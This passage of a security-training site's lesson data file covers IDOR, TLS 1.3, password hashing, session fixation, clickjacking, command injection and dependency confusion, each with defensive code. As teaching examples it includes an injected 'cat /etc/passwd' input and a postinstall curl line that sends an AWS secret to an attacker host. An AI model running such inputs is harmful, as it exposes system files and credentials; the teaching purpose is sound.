    // Return 404 or 403 to prevent ID enumeration
    throw new NotFoundError('Document not found');
  }

  return document;
}`,
        note: 'Returning 404 instead of 403 prevents attackers from probing which resource IDs exist.',
      },
    },
    faqs: [
      {
        question: 'Does using UUIDs (e.g. 550e8400-e29b-41d4-a716-446655440000) solve IDOR?',
        answer:
          'No! UUIDs prevent brute-force sequential enumeration, but they do NOT fix IDOR. If an attacker discovers a UUID via logs, shared links, or referrers, the API will still leak the data if authorization is missing. Security through obscurity is not defense.',
      },
      {
        question: 'What is horizontal vs vertical privilege escalation?',
        answer:
          "Horizontal escalation is accessing records of another user with the same role (Alice accessing Bob's files). Vertical escalation is a standard user performing actions reserved for higher roles (user modifying their account to become an administrator).",
      },
    ],
  },

  // ==========================================
  // TRACK 4: APPLIED CRYPTOGRAPHY & DATA
  // ==========================================
  {
    id: 'tls-handshake',
    title: 'TLS 1.3 Handshake & Key Exchange',
    subtitle:
      'Zero-round-trip crypto: how Elliptic-Curve Diffie-Hellman negotiates keys over an insecure network',
    track: 'crypto',
    trackTitle: 'Applied Cryptography & Data Protection',
    duration: '12 min',
    level: 'Advanced',
    summary:
      'TLS 1.3 establishes an end-to-end encrypted channel in a single round-trip (1-RTT). It deprecates legacy insecure cipher suites and uses Ephemeral Diffie-Hellman to guarantee Forward Secrecy.',
    keyConcepts: [
      'Ephemeral Diffie-Hellman (ECDHE)',
      '1-RTT Handshake Architecture',
      'Perfect Forward Secrecy (PFS)',
      'Symmetric session key derivation (HKDF)',
    ],
    threatModel: {
      actor: 'Network eavesdropper, rogue Wi-Fi hotspot, ISP, or state-level passive surveillance.',
      goal: 'Read plaintext traffic, intercept passwords/tokens, or decrypt recorded traffic retroactively.',
      vulnerability:
        'Unencrypted HTTP connections, or TLS with static RSA key exchange (lacking forward secrecy).',
      defense:
        'TLS 1.3 with Ephemeral Diffie-Hellman ensures that compromising the server’s long-term private key later cannot decrypt past recorded sessions.',
    },
    steps: [
      {
        title: 'Step 1: Client Hello with Key Share',
        description:
          'The browser initiates the connection and sends its Diffie-Hellman public key immediately.',
        detail:
          'In TLS 1.3, the client doesn’t wait for the server to negotiate! It generates an ephemeral private key `a` and sends `ClientHello` containing supported cipher suites (e.g. `TLS_AES_256_GCM_SHA384`) and its public key share `A = g^a mod p` (using X25519 or P-256).',
        actionSummary: 'Client sends ClientHello + KeyShare(A)',
        securityTakeaway:
          'By guessing the modern curve and sending its key share in the very first message, TLS 1.3 saves an entire round-trip compared to TLS 1.2.',
      },
      {
        title: 'Step 2: Server Hello & Certificate Verification',
        description:
          'The server generates its key share, computes the shared secret, and signs the handshake.',
        detail:
          'The server picks curve parameters, generates ephemeral private key `b`, and computes public key `B = g^b mod p`. The server computes the shared secret `S = A^b mod p = g^(ab) mod p`. It then sends `ServerHello` with `B`, along with its encrypted X.509 digital certificate and a digital signature verifying identity.',
        actionSummary: 'Server sends ServerHello + KeyShare(B) + EncryptedCert',
        securityTakeaway:
          'Even an active eavesdropper seeing both A and B cannot compute the shared secret S due to the Discrete Logarithm Problem.',
      },
      {
        title: 'Step 3: Shared Secret & Session Key Derivation',
        description:
          'Both client and server derive identical symmetric session keys independently.',
        detail:
          'The client receives `B` and computes `S = B^a mod p = g^(ab) mod p`. Now, both sides possess the exact same secret `S` without it ever traversing the wire! Using HKDF (HMAC-based Extract-and-Expand Key Derivation), both sides generate the symmetric client/server traffic encryption keys.',
        actionSummary: 'Both sides derive identical AES-256-GCM session keys',
        securityTakeaway:
          'Perfect Forward Secrecy: because ephemeral keys `a` and `b` are discarded after the session ends, a future theft of the server’s private certificate key CANNOT decrypt this traffic.',
      },
      {
        title: 'Step 4: 1-RTT Handshake Complete — Encrypted Application Data',
        description:
          'All subsequent HTTP requests and responses travel fully encrypted with authenticated encryption.',
        detail:
          'The client and server send `Finished` MAC verification packets. All HTTP/2 or HTTP/3 frames are encrypted with AES-GCM or ChaCha20-Poly1305. Eavesdroppers only observe pseudorandom encrypted ciphertext blocks.',
        actionSummary: 'Secure channel established: latency = 1-RTT',
        securityTakeaway:
          'Authenticated Encryption with Associated Data (AEAD) ensures both confidentiality (cannot read) and integrity (cannot tamper with packets without triggering decryption failure).',
      },
    ],
    cveCaseStudy: {
      title: 'NSA Retroactive Decryption & The Death of Static RSA',
      cveId: 'RFC 8446 Motivation',
      year: '2014-2018',
      organization: 'Global Internet Infrastructure',
      damage: 'Passive state surveillance recording encrypted traffic for future decryption',
      breakdown:
        "In TLS 1.2 and earlier, servers could use static RSA key exchange where the client encrypted the premaster secret using the server's static public key. An intelligence agency recording encrypted fiber optic traffic could store the ciphertext for years, steal or subpoena the server private key once, and decrypt all recorded historical communications!",
      rootCause: 'Lack of Ephemeral Diffie-Hellman key negotiation (No Perfect Forward Secrecy).',
      takeaway:
        'TLS 1.3 completely banned static RSA key exchanges and legacy cipher suites, mandating Ephemeral Diffie-Hellman (ECDHE).',
    },
    hardeningGuide: {
      title: 'Production TLS Hardening & HSTS Configuration',
      checklist: [
        'Disable legacy TLS 1.0 and 1.1; enforce TLS 1.2 and TLS 1.3 exclusively.',
        'Configure HTTP Strict Transport Security (HSTS) with includeSubDomains and preload.',
        'Prioritize AEAD ciphers: TLS_AES_128_GCM_SHA256 and TLS_CHACHA20_POLY1305_SHA256.',
        "Use automated certificate lifecycle management (Let's Encrypt / ACME).",
      ],
      codeSample: {
        language: 'nginx',
        filename: 'ssl.conf',
        code: `# Hardened modern Nginx SSL configuration
ssl_protocols TLSv1.2 TLSv1.3;
ssl_prefer_server_ciphers off;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;

# Strict Transport Security (2 years)
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;`,
        note: 'HSTS prevents SSL-stripping attacks on insecure public Wi-Fi networks.',
      },
    },
    faqs: [
      {
        question: 'Why was TLS 1.3 faster than TLS 1.2?',
        answer:
          'TLS 1.2 required two full network round-trips (2-RTT) before any application data could be sent. TLS 1.3 reduced this to one round-trip (1-RTT) by combining cipher negotiation with the Diffie-Hellman key share in the very first ClientHello message.',
      },
      {
        question: 'What is 0-RTT in TLS 1.3 and what is its security risk?',
        answer:
          '0-RTT (Early Data) allows returning clients to send encrypted data on the very first packet. However, 0-RTT is vulnerable to network replay attacks, so servers must never accept state-changing operations (like POST /transfer) over 0-RTT.',
      },
    ],
  },
  {
    id: 'password-hashing',
    title: 'Password Hashing & Key Derivation',
    subtitle:
      'Memory-hard cryptography: why fast hashes (MD5, SHA-256) fail and how Argon2id defeats GPU farms',
    track: 'crypto',
    trackTitle: 'Applied Cryptography & Data Protection',
    duration: '11 min',
    level: 'Intermediate',
    summary:
      'Fast cryptographic hashes like MD5 and SHA-256 can be computed billions of times per second on GPUs, rendering stored passwords trivial to crack. Explore salts, cost factors, and memory-hard algorithms like Argon2id.',
    keyConcepts: [
      'Fast vs Slow Cryptographic Hash Functions',
      'Rainbow Tables & Cryptographic Salts',
      'CPU Work Factor vs Memory Hardness',
      'Argon2id, bcrypt, and PBKDF2 specifications',
    ],
    threatModel: {
      actor: 'Attacker who has stolen a database dump containing user password hashes.',
      goal: 'Reverse-engineer the plaintext passwords using offline GPU clusters (Hashcat) and dictionary lists.',
      vulnerability:
        'Storing passwords with fast hashes (MD5, SHA-1, plain SHA-256) or without random salts.',
      defense:
        'Memory-hard password hashing (Argon2id) or adaptive work-factor functions (bcrypt cost 12).',
    },
    steps: [
      {
        title: 'Step 1: The Fatal Mistake — Fast Hash Algorithms',
        description:
          'A developer uses SHA-256 to hash passwords because it is cryptographically secure for files.',
        detail:
          'SHA-256 was designed for rapid data verification (hashing gigabytes of data per second). A modern NVIDIA RTX 4090 GPU can compute over 10 Billion SHA-256 hashes per second using Hashcat. An 8-character password can be broken in minutes!',
        actionSummary: 'Database stores plain SHA-256(password)',
        securityTakeaway:
          'What makes a hash function good for file integrity (speed) makes it catastrophic for password storage.',
      },
      {
        title: 'Step 2: The Rainbow Table Threat & Salts',
        description:
          'Unsalted hashes allow attackers to look up precomputed password tables instantly.',
        detail:
          'Attackers generate Rainbow Tables containing billions of precomputed hashes. If two users have the password `password123`, their unsalted hashes are identical. A cryptographically random Salt (16 bytes) ensures that every user has a unique hash, forcing the attacker to brute-force each account individually.',
        actionSummary: 'Salt added: hash = Hash(password + unique_salt)',
        securityTakeaway:
          'Salt eliminates precomputation and rainbow tables, but does NOT slow down brute-force GPU attacks.',
      },
      {
        title: 'Step 3: Adaptive Work Factors (bcrypt)',
        description: 'Key derivation functions introduce artificial computation loops.',
        detail:
          'bcrypt uses an adjustable cost factor $2^{\\text{cost}}$. A cost of 12 runs 4,096 iterations of Blowfish key scheduling, taking ~250 milliseconds per verification on the server. This slows an attacker down from billions of hashes per second to a few thousand.',
        actionSummary: 'bcrypt runs 4,096 iterative computation rounds',
        securityTakeaway:
          'Work factors can be increased over time as computer hardware becomes faster.',
      },
      {
        title: 'Step 4: The Next Evolution — Memory Hardness (Argon2id)',
        description:
          'Argon2id requires massive RAM to compute each hash, defeating parallel GPU/ASIC rigs.',
        detail:
          'Winner of the Password Hashing Competition. Argon2id fills a large memory buffer (e.g. 64 MB) with pseudo-random bytes and performs unpredictable memory reads. Because GPUs have very limited high-speed SRAM per core, their memory bus quickly saturates, making large-scale parallel cracking physically and economically impossible.',
        actionSummary: 'Argon2id forces 64MB RAM usage per verification thread',
        securityTakeaway:
          'Argon2id is the current gold standard recommended by OWASP and cryptography experts.',
      },
    ],
    cveCaseStudy: {
      title: 'LinkedIn SHA-1 Password Breach',
      cveId: 'LinkedIn 2012 / 2016 Leak',
      year: '2012',
      organization: 'LinkedIn Corporation',
      damage: '167 Million user passwords leaked and cracked online',
      breakdown:
        'LinkedIn stored millions of user passwords using unsalted SHA-1. In 2012, an attacker dumped the database and published the hashes online. Within days, password-cracking communities had cracked over 90% of the plaintext passwords using precomputed rainbow tables and dictionary attacks.',
      rootCause: 'Unsalted, fast cryptographic hash (SHA-1).',
      takeaway:
        'Never use plain or unsalted hashes. Migrate legacy databases to Argon2id or bcrypt.',
    },
    hardeningGuide: {
      title: 'OWASP Password Hashing Recommendations',
      checklist: [
        'Primary recommendation: Argon2id (Memory: 64 MB, Time: 3 iterations, Parallelism: 4).',
        'Alternative for legacy environments: bcrypt with cost factor 12 (approx. 250ms).',
        'Always generate a unique, cryptographically random 16-byte salt per user.',
        'Use timing-safe string comparison to prevent side-channel timing attacks.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'password-hash.ts',
        code: `import argon2 from 'argon2';

// SECURE: Argon2id with OWASP recommended parameters
export async function hashPassword(plainText: string): Promise<string> {
  return await argon2.hash(plainText, {
    type: argon2.argon2id,
    memoryCost: 65536, // 64 MB
    timeCost: 3,       // 3 iterations
    parallelism: 4     // 4 threads
  });
}

export async function verifyPassword(hash: string, plainText: string): Promise<boolean> {
  return await argon2.verify(hash, plainText);
}`,
        note: 'Argon2 automatically handles random salt generation and encodes parameters in the hash string.',
      },
    },
    faqs: [
      {
        question: 'Can I just use SHA-256 if I salt it and run it in a loop 1,000 times?',
        answer:
          'No! 1,000 iterations of SHA-256 is still trivial for a modern GPU (thousands of times faster than bcrypt or Argon2). Use dedicated, standardized key derivation functions like Argon2id or PBKDF2-HMAC-SHA256 with 600,000+ iterations.',
      },
      {
        question: 'What is a password "Pepper"?',
        answer:
          'A salt is stored in the database next to the hash. A "pepper" is an additional secret key stored in a separate secure secret store (e.g. AWS Secrets Manager / HSM). If the database is stolen, the attacker cannot begin cracking hashes without the separate pepper key.',
      },
    ],
  },
  {
    id: 'session-management',
    title: 'Session Fixation & Cookie Hijacking',
    subtitle:
      'Stateful session lifecycle: why servers must rotate session identifiers on authentication boundaries',
    track: 'auth',
    trackTitle: 'Authentication & Identity Protocols',
    duration: '9 min',
    level: 'Intermediate',
    summary:
      'When web applications maintain the same session ID before and after login, an attacker can pre-plant a trap session ID into the victim’s browser and hijack their account immediately upon authentication.',
    keyConcepts: [
      'Session Fixation vs Session Hijacking',
      'Session Regeneration on Privilege Boundaries',
      'Idle Timeout vs Absolute Expiration',
      'Secure, HttpOnly, and SameSite Flags',
    ],
    threatModel: {
      actor:
        'Network adversary, phishing link sender, or malicious third party on a shared workstation.',
      goal: 'Pre-set a known session ID in the victim’s browser and hijack their session once they log in.',
      vulnerability:
        'The backend authentication handler fails to call `session.regenerate()` upon successful credentials verification.',
      defense:
        'Invalidate the pre-login session ID upon login and issue a fresh, cryptographically random ID in a new cookie.',
    },
    steps: [
      {
        title: 'Step 1: Anonymous Visitor Receives Session ID',
        description:
          'An unauthenticated visitor visits the site, and the server generates a preliminary session.',
        detail:
          "The server sets `Set-Cookie: session_id=sess_attacker_trap_9901; Path=/; HttpOnly`. In a fixation attack, the attacker forced this specific ID into the victim's browser via an email link (`?session_id=...`) or a subdomain cookie.",
        actionSummary: 'Browser holds pre-login session_id=sess_attacker_trap_9901',
        securityTakeaway:
          'The attacker already knows this session identifier before the victim even logs in.',
      },
      {
        title: 'Step 2: The Victim Logs In Legitimating the Session',
        description: 'The victim submits their valid username and password.',
        detail:
          'The victim enters credentials. In a vulnerable application, the server marks the existing session object as authenticated (`session.userId = victim.id`) WITHOUT changing the cookie value!',
        actionSummary: 'Vulnerable server binds user account to existing pre-login session ID',
        securityTakeaway:
          'Reusing session identifiers across privilege boundaries violates the principle of separation.',
      },
      {
        title: 'Step 3: Attacker Hijacks the Account',
        description:
          'Because the attacker knows the session ID, they query the API using the trap cookie.',
        detail:
          'The attacker sends `Cookie: session_id=sess_attacker_trap_9901`. The server looks up the session in Redis, sees `authenticated: true, user: "Alice"`, and grants the attacker full access to Alice\'s account!',
        actionSummary: 'Attacker queries with trap cookie -> Full Account Takeover',
        securityTakeaway:
          'No password cracking or hash reversing was needed; the session key was fixed in advance.',
      },
      {
        title: 'Step 4: The Hardened Defense — Session Regeneration',
        description: 'The server regenerates the session ID immediately upon authentication.',
        detail:
          "Upon login, the server calls `req.session.regenerate()`. It deletes the old session record from the store and generates a fresh 128-bit random ID (`sess_fresh_random_4481_xK8`). The attacker's trap ID is rendered obsolete.",
        actionSummary: 'Server invalidates trap ID and issues fresh cryptographically random ID',
        securityTakeaway:
          'Always rotate session IDs upon login, logout, password changes, and privilege elevation.',
      },
    ],
    cveCaseStudy: {
      title: 'PHP Session Fixation in Popular Web Applications',
      cveId: 'OWASP A07:2021 Identification & Auth Failures',
      year: '2019',
      organization: 'Multiple CMS & E-Commerce Platforms',
      damage: 'Widespread silent account takeovers on shared corporate networks',
      breakdown:
        "Legacy PHP applications commonly accepted session identifiers via URL query parameters (`?PHPSESSID=...`). Attackers sent phishing links with pre-seeded IDs. When users logged in, PHP preserved the existing PHPSESSID, allowing the attacker to refresh their browser and immediately control the victim's session.",
      rootCause:
        'Failure to rotate session IDs upon authentication and accepting session IDs via GET query strings.',
      takeaway:
        'Never accept session identifiers from query parameters, and always regenerate session IDs on login.',
    },
    hardeningGuide: {
      title: 'Production Session Hardening Blueprint',
      checklist: [
        'Call req.session.regenerate() on successful authentication.',
        'Enforce an idle timeout (15-30 minutes) and an absolute timeout (8-12 hours).',
        'Store session data in secure server-side stores (Redis) rather than client cookies.',
        'Set __Host- prefix with Secure, HttpOnly, and SameSite=Lax attributes.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'session-login.ts',
        code: `// Express / Node.js session regeneration on login
app.post('/api/login', async (req, res) => {
  const user = await authenticateUser(req.body.email, req.body.password);
  
  // CRITICAL: Regenerate session ID to prevent Session Fixation
  req.session.regenerate((err) => {
    if (err) throw err;
    
    req.session.userId = user.id;
    req.session.role = user.role;
    req.session.createdAt = Date.now();
    
    res.json({ status: 'authenticated' });
  });
});`,
        note: 'Regenerating the session discards the old session ID from memory and assigns a new one.',
      },
    },
    faqs: [
      {
        question: 'What is the difference between an idle timeout and an absolute timeout?',
        answer:
          'An idle timeout expires the session if the user sends no requests for a duration (e.g. 15 minutes of inactivity). An absolute timeout forces a re-login after a fixed period (e.g. 8 hours) regardless of ongoing user activity, preventing indefinitely lingering sessions.',
      },
      {
        question: 'Should the session ID be regenerated on logout as well?',
        answer:
          'Yes! Always call session.destroy() on logout and clear the session cookie from the browser with clearCookie().',
      },
    ],
  },
  {
    id: 'clickjacking-defense',
    title: 'Clickjacking & Frame-Busting Armor',
    subtitle:
      'UI Redressing: invisible iframe overlays and modern Content-Security-Policy frame-ancestors defense',
    track: 'exploits',
    trackTitle: 'Web Exploits & Hardened Defenses',
    duration: '8 min',
    level: 'Beginner',
    summary:
      'Attackers load a sensitive target site (like your bank or email) inside a completely transparent iframe overlaying an attractive decoy game or prize button. Learn how CSP frame-ancestors prevents clickjacking.',
    keyConcepts: [
      'UI Redressing and Click Hijacking',
      'Transparent Iframe Positioning (z-index & opacity)',
      'Legacy X-Frame-Options: DENY / SAMEORIGIN',
      'Modern CSP frame-ancestors directive',
    ],
    threatModel: {
      actor: 'Malicious website operator hosting a decoy page (e.g. "Claim Free Prize").',
      goal: 'Trick the victim into executing a high-privilege action on a target site where they are already logged in.',
      vulnerability:
        'The target website permits itself to be embedded inside foreign <iframe> or <frame> elements.',
      defense:
        "HTTP response header `Content-Security-Policy: frame-ancestors 'none'` instructs modern browsers to block all framing.",
    },
    steps: [
      {
        title: 'Step 1: The Decoy Page & Transparent Overlay',
        description: 'The victim visits an attacker website offering a free gift or prize.',
        detail:
          'The attacker page displays a flashy button: "CLICK TO CLAIM $1,000". Directly on top of this button, the attacker positions an `<iframe>` pointing to `https://bank.com/transfer?amount=1000` with CSS `opacity: 0; position: absolute; z-index: 100`.',
        actionSummary:
          'Attacker overlays invisible high-privilege iframe over enticing decoy button',
        securityTakeaway:
          'The user sees only the decoy, but their physical mouse coordinates align with the invisible iframe.',
      },
      {
        title: 'Step 2: The Victim Clicks Decoy — Browser Fires on Iframe',
        description:
          'The victim clicks the button, but the event is absorbed by the invisible iframe.',
        detail:
          'Because the iframe sits at a higher z-index, the mouse click hits the bank\'s "Confirm Transfer" button inside the iframe. Because the victim is logged into the bank in another tab, the browser attaches their cookies!',
        actionSummary: 'Victim click dispatched directly to target iframe with cookies',
        securityTakeaway:
          'Ambient session cookies make un-framed web pages vulnerable to forced actions.',
      },
      {
        title: 'Step 3: Defense 1 — Legacy X-Frame-Options',
        description: 'The target site returns the HTTP header `X-Frame-Options: DENY`.',
        detail:
          'Introduced in 2008, `X-Frame-Options: DENY` tells the browser that the page must never be displayed in a frame, regardless of who is attempting to embed it.',
        actionSummary: 'Browser detects X-Frame-Options: DENY and halts iframe render',
        securityTakeaway:
          'X-Frame-Options works well for basic cases but lacks granular multi-domain support.',
      },
      {
        title: 'Step 4: Defense 2 — Content Security Policy frame-ancestors',
        description:
          'Modern CSP provides granular control over which parent origins may frame a resource.',
        detail:
          "The server returns `Content-Security-Policy: frame-ancestors 'none';` (to disallow all framing) or `frame-ancestors 'self' https://trusted-partner.com;`. Modern browsers prioritize `frame-ancestors` over legacy `X-Frame-Options`.",
        actionSummary: 'Modern browser CSP engine refuses framing on unauthorized parent origins',
        securityTakeaway:
          'CSP frame-ancestors is the modern gold standard for complete clickjacking immunity.',
      },
    ],
    cveCaseStudy: {
      title: 'Twitter "Don\'t Click" Clickjacking Worm',
      cveId: 'Twitter UI Redressing Incident',
      year: '2009',
      organization: 'Twitter',
      damage: 'Tens of thousands of user accounts force-retweeted malicious spam within hours',
      breakdown:
        'A button labeled "Don\'t Click" had an invisible Twitter iframe overlaying the "Post Tweet" button. When users clicked the decoy, they silently tweeted the exact same malicious link to all their followers, causing an exponential viral worm across the platform.',
      rootCause: 'Twitter did not return X-Frame-Options or frame-ancestors headers.',
      takeaway: "Any state-changing web page must prohibit embedding via frame-ancestors 'none'.",
    },
    hardeningGuide: {
      title: 'Frame-Busting Production Hardening',
      checklist: [
        "Set Content-Security-Policy: frame-ancestors 'none' on all authenticated web portals.",
        'Include X-Frame-Options: DENY for backwards compatibility with legacy browsers.',
        'If embedding is required for legitimate widgets, strictly whitelist parent domains.',
        'Use SameSite=Lax/Strict cookies to strip ambient authentication inside cross-origin iframes.',
      ],
      codeSample: {
        language: 'http',
        filename: 'frame-headers.conf',
        code: `# Modern clickjacking prevention headers in Nginx
add_header Content-Security-Policy "frame-ancestors 'none'" always;
add_header X-Frame-Options "DENY" always;`,
        note: "frame-ancestors 'none' completely prevents third parties from embedding your site.",
      },
    },
    faqs: [
      {
        question:
          'Can JavaScript "frame-busting" scripts (if (top !== self) top.location = self.location) protect against clickjacking?',
        answer:
          'No! JavaScript frame-busting scripts can be easily bypassed by attackers using HTML5 iframe sandboxing (sandbox="allow-forms allow-scripts") or onBeforeUnload handlers. Always use server-side HTTP response headers (CSP frame-ancestors).',
      },
      {
        question:
          "What is the difference between frame-ancestors 'self' and frame-ancestors 'none'?",
        answer:
          "'none' prevents anyone (even your own site) from embedding the page in a frame. 'self' allows your own domain to embed the page in an iframe, which is useful for modal drawers or internal widgets.",
      },
    ],
  },
  {
    id: 'command-injection',
    title: 'OS Command Injection & Remote Code Execution',
    subtitle:
      'From shell interpolation to isolated execve system calls: eliminating RCE in backend workers',
    track: 'exploits',
    trackTitle: 'Web Exploits & Hardened Defenses',
    duration: '11 min',
    level: 'Advanced',
    summary:
      'When backend applications concatenate user input into shell execution functions (`exec("ping " + input)`), attackers inject shell metacharacters (`;`, `&&`, `|`) to execute arbitrary operating system commands with web server privileges.',
    keyConcepts: [
      'Remote Code Execution (RCE) via Shell Metacharacters',
      'The difference between exec() and execFile() / spawn()',
      'The Linux execve(2) System Call and argument isolation',
      'Least privilege execution and container sandboxing',
    ],
    threatModel: {
      actor:
        'External adversary interacting with input fields that invoke server-side CLI utilities (ping, convert, tar).',
      goal: 'Execute arbitrary shell commands on the underlying operating system to steal secrets, dump database tables, or establish reverse shells.',
      vulnerability:
        'Invoking system command shells (`/bin/sh -c`) with unsanitized string-concatenated user input.',
      defense:
        'Use `execFile` or `spawn` with an array of arguments, bypassing the command shell interpreter completely.',
    },
    steps: [
      {
        title: 'Step 1: The Vulnerable Network Diagnostic Tool',
        description: 'A web app offers a feature to ping a server: `exec("ping -c 1 " + host)`.',
        detail:
          'The developer tests with legitimate inputs like `8.8.8.8`. The server passes the string to `/bin/sh -c "ping -c 1 8.8.8.8"` and returns the ping output to the user.',
        actionSummary: 'Server invokes /bin/sh with dynamic string',
        securityTakeaway:
          'Invoking a shell command interpreter (/bin/sh) is inherently hazardous when user data is involved.',
      },
      {
        title: 'Step 2: Attacker Injects Shell Metacharacters',
        description:
          'The attacker provides input containing command separators: `8.8.8.8; cat /etc/passwd`.',
        detail:
          'The semicolon `;` terminates the first command in bash/sh. The shell parses this as two separate commands: first `ping -c 1 8.8.8.8`, and immediately followed by `cat /etc/passwd`.',
        actionSummary: 'Attacker injects: 8.8.8.8; cat /etc/passwd',
        securityTakeaway:
          'The shell grammar treats attacker characters as syntax instructions rather than literal parameters.',
      },
      {
        title: 'Step 3: Arbitrary Command Execution (RCE)',
        description: 'The Linux kernel forks `/bin/sh` which spawns the second injected command.',
        detail:
          'The operating system executes `cat /etc/passwd` with the privileges of the web worker (`www-data` or `root`). The server returns the sensitive system file content to the attacker!',
        actionSummary: 'Injected command executes -> System compromised',
        securityTakeaway:
          'An attacker with RCE can read environment secrets, install backdoors, and pivot across the internal network.',
      },
      {
        title: 'Step 4: The Hardened Solution — Parameterized execFile',
        description:
          'The code is rewritten to pass arguments as an immutable array: `execFile("ping", ["-c", "1", host])`.',
        detail:
          'By using `execFile`, no command shell (`/bin/sh`) is ever invoked. The Node runtime invokes the kernel `execve(2)` system call directly. The input `8.8.8.8; cat /etc/passwd` is passed as the single literal hostname string to the ping binary.',
        actionSummary: 'execFile invokes binary directly without shell interpreter',
        securityTakeaway:
          'Just like SQL prepared statements, parameterized execFile creates a physical barrier between binary code and data arguments.',
      },
      {
        title: 'Step 5: Safe Execution with Host Resolution Error',
        description:
          'The ping utility searches for a server literally named "8.8.8.8; cat /etc/passwd".',
        detail:
          'Because no shell exists to interpret the semicolon, ping attempts to resolve the entire string as a DNS name. DNS lookup fails safely, ping exits with an error, and no rogue commands are executed.',
        actionSummary: 'ping reports unknown host; system remains completely secure',
        securityTakeaway:
          'Never use string sanitization blacklists; use architectural parameter arrays.',
      },
    ],
    cveCaseStudy: {
      title: 'ImageMagick ImageTragick RCE Vulnerability',
      cveId: 'CVE-2016-3714',
      year: '2016',
      organization: 'Thousands of Web Applications & Social Networks',
      damage: 'Unauthenticated remote code execution on major web servers processing user avatars',
      breakdown:
        'ImageMagick accepted user image uploads. When processing SVG or MVG files, ImageMagick passed file paths into `system()` calls to invoke helper utilities like `wget` or `gs`. Attackers uploaded images containing filenames with pipe characters (`"|ls -la"`), achieving instant root remote code execution.',
      rootCause: 'Passing untrusted filenames directly into the shell system() execution function.',
      takeaway:
        'Never pass filenames or user strings to shell command wrappers without strict array parameterization.',
    },
    hardeningGuide: {
      title: 'Operating System Execution Hardening',
      checklist: [
        'Always use execFile() or spawn() with argument arrays instead of exec().',
        'Avoid invoking shell: true in child_process options.',
        'Validate inputs against strict whitelists (e.g. net.isIP(input)).',
        'Run application containers with read-only root filesystems and non-root users.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'safe-exec.ts',
        code: `import { execFile } from 'child_process';
import net from 'net';

export function runDiagnostic(ipAddress: string): Promise<string> {
  // Defense-in-depth: Validate format
  if (!net.isIP(ipAddress)) {
    throw new Error('Invalid IP address format');
  }

  return new Promise((resolve, reject) => {
    // SECURE: Invokes /bin/ping directly without /bin/sh
    execFile('/bin/ping', ['-c', '1', ipAddress], (error, stdout) => {
      if (error) return reject(error);
      resolve(stdout);
    });
  });
}`,
        note: 'execFile bypasses /bin/sh, making shell metacharacters harmless.',
      },
    },
    faqs: [
      {
        question: 'Can command injection happen in Python and Go?',
        answer:
          'Yes! In Python, os.system() and subprocess.Popen(..., shell=True) are vulnerable. Use subprocess.run(["ping", "-c", "1", ip], shell=False). In Go, exec.Command("ping", "-c", "1", ip) is safe by default because it bypasses the shell.',
      },
      {
        question: 'What about input sanitization or regex escaping?',
        answer:
          'Blacklisting shell characters (like ;, &, |, $, `, \\) is notoriously fragile because attackers use alternate shell tricks ($IFS, newline \\n, wildcards, or redirection). Parameterized array passing is the only robust architectural defense.',
      },
    ],
  },
  {
    id: 'supply-chain-security',
    title: 'Supply Chain Security & Dependency Confusion',
    subtitle:
      'Protecting CI/CD pipelines from rogue public package overrides and lockfile tampering',
    track: 'architecture',
    trackTitle: 'System & Cloud Architecture',
    duration: '12 min',
    level: 'Advanced',
    summary:
      'When CI/CD pipelines configure multiple package registries without scoped namespaces, an external attacker can register identical internal package names on public registries with higher version numbers to execute malicious postinstall hooks.',
    keyConcepts: [
      'Dependency Confusion and Namespace Shadowing',
      'The Risk of postinstall lifecycle scripts',
      'Scoped package namespaces (@company/package)',
      'Immutable lockfile integrity verification (npm ci)',
    ],
    threatModel: {
      actor:
        'External adversary monitoring open-source repositories or corporate leak dumps for internal package names.',
      goal: 'Trick corporate build machines into installing and executing a malicious package from public npm/PyPI.',
      vulnerability:
        'Using unscoped package names in internal private registries with fallback to public registries.',
      defense:
        'Scoped organization namespaces (`@company/*`), explicit `.npmrc` registry routing, and strict lockfile verification.',
    },
    steps: [
      {
        title: 'Step 1: The Internal Corporate Package',
        description:
          'An enterprise builds proprietary packages hosted on an internal private registry.',
        detail:
          'The company uses an internal package named `internal-auth-token` at version `1.4.0` on an internal Artifactory or Verdaccio server. The `package.json` specifies `"internal-auth-token": "^1.4.0"`.',
        actionSummary: 'Company hosts proprietary internal-auth-token:1.4.0 on private registry',
        securityTakeaway:
          'The internal package name was not claimed or reserved on the public npmjs.org registry.',
      },
      {
        title: 'Step 2: Attacker Publishes Higher Version to Public Registry',
        description:
          'The attacker discovers the internal package name and publishes version 99.0.0 on public npm.',
        detail:
          'The attacker publishes `internal-auth-token` with version `99.0.0` to public npmjs.com. Inside `package.json`, the attacker embeds a malicious `postinstall` script: `curl https://attacker-c2.com -d "$AWS_SECRET_ACCESS_KEY"`.',
        actionSummary:
          'Attacker uploads internal-auth-token@99.0.0 with malicious postinstall script',
        securityTakeaway:
          'Package managers resolve packages by picking the highest available semver match across configured registries.',
      },
      {
        title: 'Step 3: CI/CD Build Runs Naive npm install',
        description:
          'The automated build runner evaluates registries and chooses the public version 99.0.0.',
        detail:
          "During `npm install`, the resolver sees version `1.4.0` on the private registry and version `99.0.0` on the public registry. Because `^1.4.0` accepts higher versions and public registry had `99.0.0`, the build downloads the attacker's package!",
        actionSummary: 'Package manager downloads version 99.0.0 from public registry',
        securityTakeaway:
          'Without scoped routing, public registries take precedence over private registries.',
      },
      {
        title: 'Step 4: Arbitrary Code Execution in CI/CD',
        description: 'The postinstall hook executes automatically inside the build container.',
        detail:
          'The build container executes the malicious script. The attacker receives all CI/CD environment variables, including production deploy keys, database credentials, and cloud secrets.',
        actionSummary: 'Attacker exfiltrates production deployment credentials from CI runner',
        securityTakeaway:
          'A compromised build pipeline equals a complete compromise of all downstream production systems.',
      },
      {
        title: 'Step 5: The Hardened Defense — Scoped Registries & npm ci',
        description: 'Organizations enforce scoped namespaces and immutable lockfiles.',
        detail:
          'All internal packages are renamed to `@company/internal-auth-token`. In `.npmrc`, `@company:registry` is strictly mapped to the private registry. Furthermore, CI builds run `npm ci`, which strictly enforces the cryptographic SHA-512 hashes recorded in `package-lock.json`.',
        actionSummary: 'npm ci verifies exact cryptographic hashes from package-lock.json',
        securityTakeaway:
